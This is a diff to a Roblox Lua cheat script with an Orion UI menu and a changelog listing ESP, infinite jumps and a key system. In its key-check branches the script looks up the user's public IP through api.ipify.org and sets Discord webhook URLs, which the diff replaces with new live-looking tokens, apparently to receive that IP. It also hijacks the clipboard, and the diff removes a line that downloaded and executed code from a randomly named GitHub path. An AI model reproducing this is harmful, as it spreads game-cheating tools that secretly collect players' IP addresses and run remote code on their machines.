@@ -215,7 +215,7 @@ elseif KeyInput == bannedKey then
     
     local ip = tostring(game:HttpGet("https://api.ipify.org", true))
     
-        local DiscordWebhook = "https://discord.com/api/webhooks/1039980351151411260/pxoeG6ZH_6LvaLKKJoLQAmYP-Zns3oZ2vCRekGiN-7n_6oQfG5H1UTlRZbjUyXzNxwlm" -- Discord Webhook Here
+        local DiscordWebhook = "https://discord.com/api/webhooks/1039981631395606609/DNKvhlU4d1Bwt0EQM6qnTc5x_7KNhNl0S6V0wyPqDuGH-Nrf1mEi7vwOPrTMAvJOGxKZ" -- Discord Webhook Here
         getgenv().embedcolor = "0xff0004"
 
         setclipboard("https://discord.com/invite/JN6wgVrUAr")
@@ -319,7 +319,7 @@ local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
 
-local DiscordWebhook = "https://discord.com/api/webhooks/1039980071294869605/HWobtKnXnY2Lf5EzBPhwOhjnNDQH9b_vJkjFpGrmNjITXs5ogEmmKeWzFqmW43H9IHSu" -- Discord Webhook Here
+local DiscordWebhook = "https://discord.com/api/webhooks/1039981571819704340/iCj8amiNA2Ys97uL3r0Zu_dKDA4BKtbvmuH75f4TSTFC2OBsvXvzPeeG9Sj3-zsmEHTM" -- Discord Webhook Here
 getgenv().embedcolor = "0x8cf4ff"
 
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
@@ -443,8 +443,6 @@ Tab:AddParagraph("Version 1.3"," |  Universal |                                 
 Tab:AddParagraph("Version 1.2"," |  Universal |                                                                                   [*] Rewrote Tracer Esp and Box Esp.                                                 [*] Fixed Inf Jumps                                                                         [*] Performance Improvements                                                                         [*] Added a Key System")
 
 OrionLib:Init()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/wH0r9m7O3d2NsctT06dZs3F018d6ZBMeiriJW"))()
 
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
 
